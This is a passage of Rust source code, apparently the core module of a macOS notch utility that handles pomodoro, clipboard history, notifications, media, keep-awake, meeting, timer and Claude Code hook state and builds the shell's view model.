//! The application core: owns every module, routes inputs to them, wires the
//! cross-module rules (focus silences low-priority notifications, agent events
//! become notifications, …) and produces the view model the shell renders.

use serde::{Deserialize, Serialize};

use crate::agent::hooks::truncate_chars;
use crate::agent::{
    sanitize, AgentConfig, AgentSession, AgentStatus, Agents, Decision, HookEvent, HookKind,
    HookOutcome, PermissionRequest, Resolved,
};
use crate::analytics::{
    day_index, Analytics, AnalyticsConfig, Feature, FeatureCount, PersistedAnalytics,
};
use crate::caffeine::{AwakeMode, Caffeine, CaffeineConfig, CaffeineEffect, LidState, PowerStatus};
use crate::clipboard::{
    ClipCapture, ClipKind, ClipboardConfig, ClipboardHistory, PersistedClipboard,
};
use crate::countdown::{Countdown, TimerRun, TimerView};
use crate::media::{Media, MediaCommand, NowPlaying};
use crate::meeting::{AgendaInput, Meeting, MeetingEvent, MeetingRun, MeetingView, SavedAgenda};
use crate::notify::{
    Notification, NotificationCenter, NotificationInput, NotifyConfig, NotifyEvent, OpenTarget,
    Priority,
};
use crate::pomodoro::{Phase, Pomodoro, PomodoroConfig, PomodoroEvent, PomodoroStats, RunState};
use crate::usage::{local_day_start_ms, Usage, UsageRecord, UsageSnapshot};

/// Version of the persisted file layout.
pub const PERSIST_VERSION: u32 = 1;

const CLIP_PREVIEW_CHARS: usize = 160;
const CLIP_VIEW_ITEMS: usize = 60;
/// File paths sent per file clip, for thumbnails.
const CLIP_VIEW_FILES: usize = 4;
const HISTORY_VIEW_ITEMS: usize = 30;
const ANALYTICS_VIEW_DAYS: u32 = 30;
/// Limits for notifications posted by other processes over the socket.
const EXTERNAL_TITLE_CHARS: usize = 120;
const EXTERNAL_BODY_CHARS: usize = 500;
const EXTERNAL_SOURCE_CHARS: usize = 40;
const EXTERNAL_MAX_TTL_SECS: u32 = 60;
/// Prefix of the group given to notifications read from other apps'
/// banners. Each gets a unique group, so none replaces another; the NUL
/// keeps any other sender from imitating it.
const SYSTEM_GROUP: &str = "\u{0}system-";
/// Notification sources only the core itself uses.
const RESERVED_SOURCES: &[&str] = &[
    "agent",
    "litenotch",
    "pomodoro",
    "meeting",
    "timer",
    "usage",
    "caffeine",
    "color",
];
/// Usage percentages that raise an alert, lowest first.
const USAGE_ALERT_LEVELS: [u8; 2] = [80, 95];

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct General {
    /// Keep clipboard history across restarts. Off by default because the
    /// history can contain secrets that were not marked as such.
    pub persist_clipboard: bool,
    /// Open the panel when the pointer rests on the notch.
    pub hover_to_expand: bool,
    /// Notify when a usage window passes 80 % and 95 %.
    pub usage_alerts: bool,
    /// Show the notch on every display instead of only the built-in one.
    pub all_screens: bool,
}

impl Default for General {
    fn default() -> Self {
        Self {
            persist_clipboard: false,
            hover_to_expand: true,
            usage_alerts: true,
            all_screens: false,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct MediaConfig {
    /// Show what is playing. Off also stops the now-playing helper process.
    pub enabled: bool,
}

impl Default for MediaConfig {
    fn default() -> Self {
        Self { enabled: true }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum ThemeChoice {
    /// Follow the system's light / dark setting.
    #[default]
    System,
    Dark,
    Light,
}

/// How the notch is drawn. `Attached` hangs from the top edge in the
/// notch's own silhouette; `Floating` is a capsule inside the menu bar, and
/// the toast and the open panel float just below it.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum NotchStyle {
    #[default]
    Attached,
    Floating,
}

/// How the closed notch and the toast are drawn.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum ClosedNotch {
    /// Black in every theme, so it reads as part of the hardware notch.
    #[default]
    Dark,
    /// Follows `theme`, like the open panel.
    Theme,
}

/// What the open panel is drawn with. Glass is the macOS 26 Liquid Glass
/// material; the shell falls back to Solid where the system (or the SDK it
/// was built with) lacks it. The closed notch and the toast stay black in
/// either case so they blend into the hardware notch.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum Material {
    #[default]
    Solid,
    Glass,
}

pub const DEFAULT_ACCENT: &str = "#FF9E0A";

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct Appearance {
    pub theme: ThemeChoice,
    /// `#RRGGBB`, upper case.
    pub accent: String,
    pub notch_style: NotchStyle,
    pub closed_notch: ClosedNotch,
    pub material: Material,
}

impl Default for Appearance {
    fn default() -> Self {
        Self {
            theme: ThemeChoice::System,
            accent: DEFAULT_ACCENT.into(),
            notch_style: NotchStyle::Attached,
            closed_notch: ClosedNotch::Dark,
            material: Material::Solid,
        }
    }
}

/// `#rrggbb` or `rrggbb` in any case as `#RRGGBB`; anything else is `None`.
pub fn normalize_hex(s: &str) -> Option<String> {
    let digits = s.trim().trim_start_matches('#');
    (digits.len() == 6 && digits.chars().all(|c| c.is_ascii_hexdigit()))
        .then(|| format!("#{}", digits.to_ascii_uppercase()))
}

/// Most colours remembered from the picker.
pub const MAX_COLORS: usize = 8;

#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct Settings {
    pub general: General,
    pub appearance: Appearance,
    pub media: MediaConfig,
    pub pomodoro: PomodoroConfig,
    pub clipboard: ClipboardConfig,
    pub notify: NotifyConfig,
    pub caffeine: CaffeineConfig,
    pub agent: AgentConfig,
    pub analytics: AnalyticsConfig,
}

/// What is written to disk.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct Persisted {
    pub version: u32,
    pub settings: Settings,
    pub pomodoro: PomodoroStats,
    pub analytics: PersistedAnalytics,
    pub clipboard: Option<PersistedClipboard>,
    pub meeting: Option<SavedAgenda>,
    /// Colours picked from the screen, newest first.
    pub colors: Vec<String>,
    /// The countdown timer's last length.
    pub timer_secs: Option<u32>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Tab {
    Home,
    Music,
    Timer,
    Clipboard,
    Agents,
    Inbox,
    Settings,
}

/// Everything the shell can ask for. Serialized as `{"cmd": "...", ...}`.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "cmd", rename_all = "snake_case")]
pub enum Command {
    PomodoroToggle,
    PomodoroSkip,
    PomodoroReset,
    ClipCopy {
        id: u64,
    },
    /// Copy an item back without its formatting.
    ClipCopyPlain {
        id: u64,
    },
    ClipPin {
        id: u64,
        pinned: bool,
    },
    ClipRemove {
        id: u64,
    },
    ClipClear,
    ClipQuery {
        query: String,
    },
    NotifyDismissBanner,
    NotifyDismiss {
        id: u64,
    },
    NotifyMarkRead,
    /// One notification was opened, so it has been read.
    NotifyOpened {
        id: u64,
    },
    NotifyClear,
    Media {
        action: MediaCommand,
    },
    /// Sets the countdown timer's length (stops it).
    TimerSet {
        secs: u32,
    },
    /// Start, pause or resume the countdown.
    TimerToggle,
    TimerReset,
    /// Adds time to the countdown.
    TimerAdd {
        secs: u32,
    },
    MeetingLoad {
        preset: String,
    },
    /// Replaces the agenda (only while no meeting is running).
    MeetingSet {
        title: String,
        items: Vec<AgendaInput>,
    },
    /// Start, pause or resume.
    MeetingToggle,
    /// Finish the current item and go to the next.
    MeetingNext,
    MeetingReset,
    /// A colour sampled from the screen, as `#RRGGBB`.
    ColorPicked {
        hex: String,
    },
    /// A banner another app posted, read by the shell from the screen.
    NotifySystem {
        app: String,
        title: String,
        body: String,
    },
    AgentDecide {
        request_id: String,
        decision: Decision,
    },
    CaffeineToggle,
    CaffeineActivate {
        mode: AwakeMode,
        duration_secs: Option<u32>,
    },
    CaffeineLid {
        on: bool,
    },
    SetSettings {
        settings: Box<Settings>,
    },
    PanelOpened,
    TabOpened {
        tab: Tab,
    },
    AnalyticsClear,
    /// The system time zone's offset from UTC, for day boundaries.
    SetUtcOffset {
        secs: i32,
    },
    /// Re-send the view model.
    Refresh,
}

/// Everything that can happen to the core.
#[derive(Debug, Clone, PartialEq)]
pub enum Input {
    Command(Command),
    ClipCaptured(ClipCapture),
    Power(PowerStatus),
    LidResult {
        ok: bool,
    },
    Statusline(String),
    ExternalNotify(NotificationInput),
    /// One assistant message from a session transcript.
    UsageRecord {
        record: UsageRecord,
        day_start_ms: u64,
        day_end_ms: u64,
    },
    /// What the system reports as playing; `None` when nothing is.
    NowPlaying(Option<NowPlaying>),
    UsageResetToday,
    /// The lid's state, read while closed-lid mode is on.
    Clamshell {
        closed: bool,
        external_display: bool,
    },
    UtcOffset(i32),
    HooksInstalled(Option<bool>),
    StatuslineInstalled(Option<bool>),
    /// A notification from the runtime itself (not from the socket).
    OwnNotify(NotificationInput),
    Tick,
}

/// Work for the platform layer.
#[derive(Debug, Clone, PartialEq)]
pub enum Effect {
    SetAssertion(AwakeMode),
    EnableLid,
    DisableLid,
    WriteClipboard(String),
    /// Turn the displays off (the lid was just closed in closed-lid mode).
    SleepDisplay,
    /// Put the image in this file back on the pasteboard.
    WriteClipboardImage(String),
    /// Put text back with the formatting saved in `path`.
    WriteClipboardRich {
        text: String,
        path: String,
    },
    /// Send a transport command to whatever is playing.
    MediaCommand(MediaCommand),
    /// Answer the hook CLI waiting on this request.
    Resolve(Resolved),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ActivityKind {
    Idle,
    Approval,
    Banner,
    Pomodoro,
    Media,
    Caffeine,
    Agent,
    Meeting,
    Timer,
}

/// What the closed notch shows.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct CompactView {
    pub kind: ActivityKind,
    pub title: String,
    pub value: String,
    /// When set, the shell renders a live countdown to this time.
    pub ends_at_ms: Option<u64>,
    pub total_secs: Option<u32>,
    pub count: u32,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct PomodoroView {
    pub phase: Phase,
    pub run_state: RunState,
    /// Remaining time while not running; while running use `ends_at_ms`.
    pub remaining_secs: u32,
    pub total_secs: u32,
    pub ends_at_ms: Option<u64>,
    pub round: u32,
    pub rounds_before_long: u32,
    pub completed_today: u32,
    pub focus_secs_today: u64,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct MediaView {
    pub app: String,
    pub title: String,
    pub artist: String,
    pub album: String,
    pub playing: bool,
    pub duration_ms: Option<u64>,
    /// Position at `position_at_ms`; the shell extrapolates while playing.
    pub position_ms: Option<u64>,
    pub position_at_ms: u64,
    pub controllable: bool,
    /// Image file of the artwork, when the playing app provides one.
    pub artwork_path: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ClipView {
    pub id: u64,
    pub kind: ClipKind,
    pub preview: String,
    pub source_app: Option<String>,
    pub created_ms: u64,
    pub pinned: bool,
    /// For an image: the file holding it, for a thumbnail.
    pub image_path: Option<String>,
    /// Text copied with formatting, which a plain copy leaves out.
    pub rich: bool,
    /// For files: the first few paths.
    pub files: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ClipboardView {
    pub items: Vec<ClipView>,
    pub total: usize,
    pub query: String,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct InboxView {
    pub banner: Option<Notification>,
    pub history: Vec<Notification>,
    pub unread: usize,
    pub dnd: bool,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct AgentsView {
    pub sessions: Vec<AgentSession>,
    pub pending: Vec<PermissionRequest>,
    /// Whether the Claude Code hooks are registered; `None` if unknown.
    pub hooks_installed: Option<bool>,
    /// Whether Claude Code's status line goes through LiteNotch, which is
    /// what brings the usage limits; `None` if unknown.
    pub statusline_installed: Option<bool>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct CaffeineView {
    pub mode: AwakeMode,
    pub lid: LidState,
    pub until_ms: Option<u64>,
    pub guard: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ViewModel {
    pub compact: CompactView,
    /// Something needs the user now (approval or banner): open the notch.
    pub attention: bool,
    pub pomodoro: PomodoroView,
    pub media: Option<MediaView>,
    pub clipboard: ClipboardView,
    pub inbox: InboxView,
    pub agents: AgentsView,
    pub usage: UsageSnapshot,
    pub caffeine: CaffeineView,
    pub meeting: MeetingView,
    pub timer: TimerView,
    /// Colours picked from the screen, newest first.
    pub colors: Vec<String>,
    pub analytics: Vec<FeatureCount>,
    pub settings: Settings,
}

pub struct Core {
    settings: Settings,
    pomodoro: Pomodoro,
    clipboard: ClipboardHistory,
    notify: NotificationCenter,
    caffeine: Caffeine,
    media: Media,
    agents: Agents,
    usage: Usage,
    meeting: Meeting,
    /// Makes each captured banner's group unique.
    system_seq: u64,
    timer: Countdown,
    colors: Vec<String>,
    /// The lid is closed with no external display.
    lid_shut: bool,
    /// The assertion keep-awake asked for; with the lid shut a display
    /// assertion is lowered to a system one.
    wanted_assertion: AwakeMode,
    analytics: Analytics,
    utc_offset_secs: i32,
    clip_query: String,
    dnd: bool,
    /// Highest alert level already raised per usage window (5 h, 7 d).
    usage_alerted: [u8; 2],
    hooks_installed: Option<bool>,
    statusline_installed: Option<bool>,
    dirty: bool,
}

impl Default for Core {
    fn default() -> Self {
        Self::new(Persisted::default())
    }
}

/// `5 min`, `1 h 30 min`, `45 s`.
fn duration_label(secs: u32) -> String {
    let (h, m, s) = (secs / 3600, secs / 60 % 60, secs % 60);
    match (h, m, s) {
        (0, 0, s) => format!("{s} s"),
        (0, m, 0) => format!("{m} min"),
        (0, m, s) => format!("{m} min {s} s"),
        (h, 0, _) => format!("{h} h"),
        (h, m, _) => format!("{h} h {m} min"),
    }
}

fn mmss(secs: u32) -> String {
    format!("{}:{:02}", secs / 60, secs % 60)
}

fn phase_label(phase: Phase) -> &'static str {
    match phase {
        Phase::Idle => "Pomodoro",
        Phase::Focus => "Focus",
        Phase::ShortBreak => "Break",
        Phase::LongBreak => "Long break",
    }
}

impl Core {
    /// Builds the core from what was saved last time (or defaults).
    pub fn new(saved: Persisted) -> Self {
        let Persisted {
            settings,
            pomodoro: stats,
            analytics,
            clipboard,
            meeting,
            colors,
            timer_secs,
            ..
        } = saved;
        let mut pomodoro = Pomodoro::new(settings.pomodoro.clone());
        pomodoro.restore_stats(stats);
        let clipboard = match clipboard.filter(|_| settings.general.persist_clipboard) {
            Some(saved) => ClipboardHistory::from_persisted(settings.clipboard.clone(), saved),
            None => ClipboardHistory::new(settings.clipboard.clone()),
        };
        Core {
            utc_offset_secs: settings.pomodoro.utc_offset_secs,
            pomodoro,
            clipboard,
            notify: NotificationCenter::new(settings.notify.clone()),
            caffeine: Caffeine::new(settings.caffeine.clone()),
            media: Media::new(),
            agents: Agents::new(settings.agent.clone()),
            usage: Usage::new(),
            meeting: Meeting::from_saved(meeting),
            timer: Countdown::new(timer_secs.unwrap_or(300)),
            system_seq: 0,
            lid_shut: false,
            wanted_assertion: AwakeMode::Off,
            colors: colors
                .iter()
                .filter_map(|c| normalize_hex(c))
                .take(MAX_COLORS)
                .collect(),
            analytics: Analytics::from_persisted(settings.analytics.clone(), analytics),
            settings,
            clip_query: String::new(),
            dnd: false,
            usage_alerted: [0; 2],
            hooks_installed: None,
            statusline_installed: None,
            dirty: false,
        }
    }

    pub fn persisted(&self) -> Persisted {
        Persisted {
            version: PERSIST_VERSION,
            settings: self.settings.clone(),
            pomodoro: self.pomodoro.stats(),
            analytics: self.analytics.to_persisted(),
            clipboard: self
                .settings
                .general
                .persist_clipboard
                .then(|| self.clipboard.to_persisted()),
            meeting: Some(self.meeting.saved()),
            colors: self.colors.clone(),
            timer_secs: Some(self.timer.duration_secs()),
        }
    }

    /// True once since the last call if something worth saving changed.
    pub fn take_dirty(&mut self) -> bool {
        std::mem::take(&mut self.dirty)
    }

    /// Whether the clipboard history would keep this copy (see
    /// `ClipboardHistory::would_keep`).
    pub fn clip_would_keep(&self, capture: &ClipCapture) -> bool {
        self.clipboard.would_keep(capture)
    }

    /// Files (images, formatting) the clipboard history refers to.
    pub fn clip_file_paths(&self) -> Vec<String> {
        self.clipboard.file_paths()
    }

    pub fn settings(&self) -> &Settings {
        &self.settings
    }

    /// Whether the platform should keep watching the battery.
    pub fn wants_power_updates(&self) -> bool {
        let snap = self.caffeine.snapshot(0);
        snap.mode != AwakeMode::Off || snap.lid != LidState::Off
    }

    /// Earliest time at which `Input::Tick` will change something.
    pub fn next_deadline(&self) -> Option<u64> {
        [
            self.pomodoro.next_deadline(),
            self.caffeine.next_deadline(),
            self.notify.next_deadline(),
            self.agents.next_deadline(),
            self.meeting.next_deadline(),
            self.timer.next_deadline(),
        ]
        .into_iter()
        .flatten()
        .min()
    }

    fn count(&mut self, feature: Feature, now: u64) {
        if self
            .analytics
            .record(feature, day_index(now, self.utc_offset_secs))
        {
            self.dirty = true;
        }
    }

    pub fn apply(&mut self, input: Input, now: u64) -> Vec<Effect> {
        let mut fx = Vec::new();
        // Catch up first: after the Mac wakes, the user's click can arrive
        // before any tick, and must act on the state as of now (a focus that
        // ended during sleep is complete, not "skipped").
        self.settle(now, &mut fx);
        match input {
            Input::Command(cmd) => self.command(cmd, now, &mut fx),
            Input::ClipCaptured(capture) => {
                self.clipboard.capture(capture, now);
                self.dirty |= self.settings.general.persist_clipboard;
            }
            Input::Power(status) => {
                let effects = self.caffeine.on_power(status, now);
                self.caffeine_effects(effects, now, &mut fx);
            }
            Input::LidResult { ok } => {
                let effects = self.caffeine.lid_result(ok, now);
                self.caffeine_effects(effects, now, &mut fx);
            }
            Input::Statusline(json) => {
                if self.usage.on_statusline(&json, now).is_ok() {
                    self.usage_alerts(now);
                }
            }
            Input::ExternalNotify(input) => self.external_notify(input, now),
            Input::UsageRecord {
                record,
                day_start_ms,
                day_end_ms,
            } => {
                self.usage.ingest(&record, day_start_ms, day_end_ms);
            }
            Input::NowPlaying(playing) => {
                let enabled = self.settings.media.enabled;
                self.media.set(playing.filter(|_| enabled));
            }
            Input::UsageResetToday => self.usage.reset_today(),
            Input::Clamshell {
                closed,
                external_display,
            } => self.clamshell(closed, external_display, &mut fx),
            Input::UtcOffset(secs) => self.set_utc_offset(secs),
            Input::HooksInstalled(state) => self.hooks_installed = state,
            Input::StatuslineInstalled(state) => self.statusline_installed = state,
            Input::OwnNotify(input) => self.post(input, now),
            Input::Tick => {}
        }
        self.settle(now, &mut fx);
        fx
    }

    /// Handles one Claude Code hook payload. `Pending` means the caller must
    /// hold the hook open until an `Effect::Resolve` for that request appears.
    pub fn hook(&mut self, json: &str, now: u64) -> (HookOutcome, Vec<Effect>) {
        let mut fx = Vec::new();
        let Ok(event) = HookEvent::parse(json) else {
            return (HookOutcome::Ack, fx);
        };
        self.settle(now, &mut fx);
        let outcome = self.agents.on_hook(&event, now);
        if !self.settings.agent.enabled {
            return (outcome, fx);
        }
        let project = self
            .agents
            .sessions()
            .iter()
            .find(|s| s.id == event.session_id)
            .map(|s| s.project.clone())
            .filter(|p| !p.is_empty())
            .unwrap_or_else(|| "Agent".to_string());
        match (&event.kind, &outcome) {
            (HookKind::PermissionRequest, HookOutcome::Pending(_)) => {
                self.count(Feature::AgentRequest, now);
            }
            (HookKind::Stop, _) => {
                let body = event
                    .last_assistant_message
                    .as_deref()
                    .unwrap_or("Ready for your next prompt.");
                self.post(
                    NotificationInput {
                        source: "agent".into(),
                        title: format!("{project} finished"),
                        body: truncate_chars(&sanitize(body), 160),
                        priority: Priority::Normal,
                        group: Some(format!("agent-{}", event.session_id)),
                        ttl_secs: None,
                    },
                    now,
                );
            }
            (HookKind::Notification, _)
                if matches!(
                    event.notification_type.as_deref(),
                    Some("idle_prompt") | Some("agent_needs_input")
                ) =>
            {
                let body = event.message.as_deref().unwrap_or("Waiting for you.");
                self.post(
                    NotificationInput {
                        source: "agent".into(),
                        title: format!("{project} needs input"),
                        body: truncate_chars(&sanitize(body), 160),
                        priority: Priority::High,
                        group: Some(format!("agent-{}", event.session_id)),
                        ttl_secs: None,
                    },
                    now,
                );
            }
            _ => {}
        }
        self.settle(now, &mut fx);
        (outcome, fx)
    }

    fn command(&mut self, cmd: Command, now: u64, fx: &mut Vec<Effect>) {
        match cmd {
            Command::PomodoroToggle => {
                let was_stopped = self.pomodoro.snapshot(now).run_state == RunState::Stopped;
                let events = self.pomodoro.toggle(now);
                if was_stopped {
                    self.count(Feature::PomodoroStart, now);
                }
                self.pomodoro_events(events, now);
            }
            Command::PomodoroSkip => {
                let events = self.pomodoro.skip(now);
                if !events.is_empty() {
                    self.count(Feature::PomodoroSkip, now);
                }
                self.pomodoro_events(events, now);
            }
            Command::PomodoroReset => {
                let events = self.pomodoro.reset();
                self.pomodoro_events(events, now);
            }
            Command::ClipCopy { id } => {
                if let Some(item) = self.clipboard.get(id) {
                    // Files are kept as their paths, so copying them back
                    // yields text; images come back from their saved file.
                    fx.push(match (&item.image_path, &item.rich_path) {
                        (Some(path), _) => Effect::WriteClipboardImage(path.clone()),
                        (None, Some(path)) => Effect::WriteClipboardRich {
                            text: item.text.clone(),
                            path: path.clone(),
                        },
                        (None, None) => Effect::WriteClipboard(item.text.clone()),
                    });
                    self.count(Feature::ClipboardCopy, now);
                }
            }
            Command::ClipPin { id, pinned } => {
                if self.clipboard.set_pinned(id, pinned) {
                    self.count(Feature::ClipboardPin, now);
                    self.dirty |= self.settings.general.persist_clipboard;
                }
            }
            Command::ClipRemove { id } => {
                self.dirty |= self.clipboard.remove(id) && self.settings.general.persist_clipboard;
            }
            Command::ClipClear => {
                self.clipboard.clear(true);
                self.dirty |= self.settings.general.persist_clipboard;
            }
            Command::ClipQuery { query } => {
                if self.clip_query.is_empty() && !query.is_empty() {
                    self.count(Feature::ClipboardSearch, now);
                }
                self.clip_query = query;
            }
            Command::NotifyDismissBanner => {
                let events = self.notify.dismiss_banner(now);
                self.notify_events(events, now);
            }
            Command::NotifyDismiss { id } => {
                let events = self.notify.dismiss(id, now);
                self.notify_events(events, now);
            }
            Command::NotifyMarkRead => self.notify.mark_all_read(),
            Command::NotifyOpened { id } => {
                self.notify.mark_read(id);
            }
            Command::NotifyClear => self.notify.clear_history(),
            Command::Media { action } => {
                if self.media.active().is_some() {
                    fx.push(Effect::MediaCommand(action));
                    self.count(Feature::MediaControl, now);
                }
            }
            Command::NotifySystem { app, title, body } => self.system_notify(app, title, body, now),
            Command::ClipCopyPlain { id } => {
                if let Some(item) = self.clipboard.get(id).filter(|i| i.kind != ClipKind::Image) {
                    fx.push(Effect::WriteClipboard(item.text.clone()));
                    self.count(Feature::ClipboardCopy, now);
                }
            }
            Command::TimerSet { secs } => self.dirty |= self.timer.set(secs),
            Command::TimerToggle => {
                if self.timer.toggle(now) {
                    self.count(Feature::TimerStart, now);
                }
            }
            Command::TimerReset => self.timer.reset(),
            Command::TimerAdd { secs } => {
                let before = self.timer.duration_secs();
                self.timer.add(secs, now);
                self.dirty |= self.timer.duration_secs() != before;
            }
            Command::MeetingLoad { preset } => {
                self.dirty |= self.meeting.load_preset(&preset);
            }
            Command::MeetingSet { title, items } => {
                self.dirty |= self.meeting.set_agenda(&title, &items);
            }
            Command::MeetingToggle => {
                let events = self.meeting.toggle(now);
                self.meeting_events(events, now);
            }
            Command::MeetingNext => {
                let events = self.meeting.next(now);
                self.meeting_events(events, now);
            }
            Command::MeetingReset => self.meeting.reset(),
            Command::ColorPicked { hex } => {
                if let Some(hex) = normalize_hex(&hex) {
                    fx.push(Effect::WriteClipboard(hex.clone()));
                    self.colors.retain(|c| *c != hex);
                    self.colors.insert(0, hex.clone());
                    self.colors.truncate(MAX_COLORS);
                    self.dirty = true;
                    self.count(Feature::ColorPick, now);
                    self.post(
                        NotificationInput {
                            source: "color".into(),
                            title: format!("Copied {hex}"),
                            body: "Colour picked from the screen.".into(),
                            priority: Priority::Normal,
                            group: Some("color".into()),
                            ttl_secs: Some(3),
                        },
                        now,
                    );
                }
            }
            Command::AgentDecide {
                request_id,
                decision,
            } => {
                // A request whose command is not fully visible cannot be
                // allowed from the notch, whatever the shell sends.
                let blocked = decision == Decision::Allow
                    && self
                        .agents
                        .pending()
                        .iter()
                        .any(|r| r.id == request_id && r.truncated);
                let decision = if blocked { Decision::Pass } else { decision };
                if let Some(resolved) = self.agents.decide(&request_id, decision, now) {
                    self.count(
                        match decision {
                            Decision::Allow => Feature::AgentAllow,
                            Decision::Deny => Feature::AgentDeny,
                            Decision::Pass => Feature::AgentPass,
                        },
                        now,
                    );
                    fx.push(Effect::Resolve(resolved));
                }
            }
            Command::CaffeineToggle => {
                let on = self.caffeine.snapshot(now).mode != AwakeMode::Off;
                let effects = if on {
                    self.caffeine.deactivate(now)
                } else {
                    self.count(Feature::CaffeineOn, now);
                    self.caffeine
                        .activate(self.settings.caffeine.default_mode, None, now)
                };
                self.caffeine_effects(effects, now, fx);
            }
            Command::CaffeineActivate {
                mode,
                duration_secs,
            } => {
                if mode != AwakeMode::Off {
                    self.count(Feature::CaffeineOn, now);
                }
                let effects = self.caffeine.activate(mode, duration_secs, now);
                self.caffeine_effects(effects, now, fx);
            }
            Command::CaffeineLid { on } => {
                if on {
                    self.count(Feature::LidModeOn, now);
                }
                let effects = self.caffeine.set_lid(on, now);
                self.caffeine_effects(effects, now, fx);
            }
            Command::SetSettings { settings } => self.set_settings(*settings, now),
            Command::PanelOpened => self.count(Feature::PanelOpen, now),
            Command::TabOpened { tab } => self.count(
                match tab {
                    Tab::Home => Feature::TabHome,
                    Tab::Music => Feature::TabMusic,
                    Tab::Timer => Feature::TabTimer,
                    Tab::Clipboard => Feature::TabClipboard,
                    Tab::Agents => Feature::TabAgents,
                    Tab::Inbox => Feature::TabInbox,
                    Tab::Settings => Feature::TabSettings,
                },
                now,
            ),
            Command::AnalyticsClear => {
                self.analytics.clear();
                self.dirty = true;
            }
            Command::SetUtcOffset { secs } => self.set_utc_offset(secs),
            Command::Refresh => {}
        }
    }

    fn set_utc_offset(&mut self, secs: i32) {
        // Real offsets are within a day; anything else is a bad caller.
        let secs = secs.clamp(-86_400, 86_400);
        self.utc_offset_secs = secs;
        self.settings.pomodoro.utc_offset_secs = secs;
        self.pomodoro.set_config(self.settings.pomodoro.clone());
    }

    fn set_settings(&mut self, mut settings: Settings, now: u64) {
        settings.appearance.accent = normalize_hex(&settings.appearance.accent)
            .unwrap_or_else(|| DEFAULT_ACCENT.to_string());
        // The offset comes from the system, not from the settings form.
        settings.pomodoro.utc_offset_secs = self.utc_offset_secs;
        self.pomodoro.set_config(settings.pomodoro.clone());
        self.clipboard.set_config(settings.clipboard.clone());
        self.notify.set_config(settings.notify.clone());
        self.caffeine.set_config(settings.caffeine.clone());
        self.agents.set_config(settings.agent.clone());
        if !settings.media.enabled {
            self.media.set(None);
        }
        self.analytics.set_config(settings.analytics.clone());
        // Store what the modules accepted after clamping.
        settings.pomodoro = self.pomodoro.config().clone();
        settings.clipboard = self.clipboard.config().clone();
        settings.caffeine = self.caffeine.config().clone();
        settings.agent = self.agents.config().clone();
        self.settings = settings;
        self.dirty = true;
        self.count(Feature::SettingsChange, now);
    }

    /// Runs every timer and derived rule until nothing more changes at `now`.
    fn settle(&mut self, now: u64, fx: &mut Vec<Effect>) {
        let events = self.pomodoro.tick(now);
        self.pomodoro_events(events, now);
        let effects = self.caffeine.tick(now);
        self.caffeine_effects(effects, now, fx);
        for resolved in self.agents.tick(now) {
            self.count(Feature::AgentPass, now);
            fx.push(Effect::Resolve(resolved));
        }
        let events = self.meeting.tick(now);
        self.meeting_events(events, now);
        if self.timer.tick(now) {
            self.post(
                NotificationInput {
                    source: "timer".into(),
                    title: "Timer done".into(),
                    body: format!("{} is up.", duration_label(self.timer.duration_secs())),
                    priority: Priority::High,
                    group: Some("timer".into()),
                    ttl_secs: None,
                },
                now,
            );
        }
        let offset = self.settings.pomodoro.utc_offset_secs;
        self.usage.set_day(local_day_start_ms(now, offset));
        self.sync_dnd(now);
        let events = self.notify.tick(now);
        self.notify_events(events, now);
    }

    fn sync_dnd(&mut self, now: u64) {
        let want = self.settings.notify.dnd_during_focus && self.pomodoro.is_focus_running();
        if want != self.dnd {
            self.dnd = want;
            let events = self.notify.set_dnd(want, now);
            self.notify_events(events, now);
        }
    }

    fn pomodoro_events(&mut self, events: Vec<PomodoroEvent>, now: u64) {
        if events.is_empty() {
            return;
        }
        // Lift focus silence first so the "focus done" notice is shown.
        self.sync_dnd(now);
        for event in events {
            let PomodoroEvent::PhaseCompleted {
                phase,
                skipped: false,
            } = event
            else {
                continue;
            };
            let (title, body) = match phase {
                Phase::Focus => {
                    self.count(Feature::PomodoroComplete, now);
                    self.dirty = true;
                    ("Focus complete", "Time for a break.")
                }
                Phase::ShortBreak | Phase::LongBreak => ("Break over", "Ready for the next focus?"),
                Phase::Idle => continue,
            };
            self.post(
                NotificationInput {
                    source: "pomodoro".into(),
                    title: title.into(),
                    body: body.into(),
                    priority: Priority::High,
                    group: Some("pomodoro".into()),
                    ttl_secs: None,
                },
                now,
            );
        }
    }

    fn caffeine_effects(&mut self, effects: Vec<CaffeineEffect>, now: u64, fx: &mut Vec<Effect>) {
        for effect in effects {
            match effect {
                CaffeineEffect::SetAssertion(mode) => {
                    self.wanted_assertion = mode;
                    fx.push(Effect::SetAssertion(self.effective_assertion()));
                }
                CaffeineEffect::EnableLid => fx.push(Effect::EnableLid),
                CaffeineEffect::DisableLid => fx.push(Effect::DisableLid),
                CaffeineEffect::Notice { title, body } => self.post(
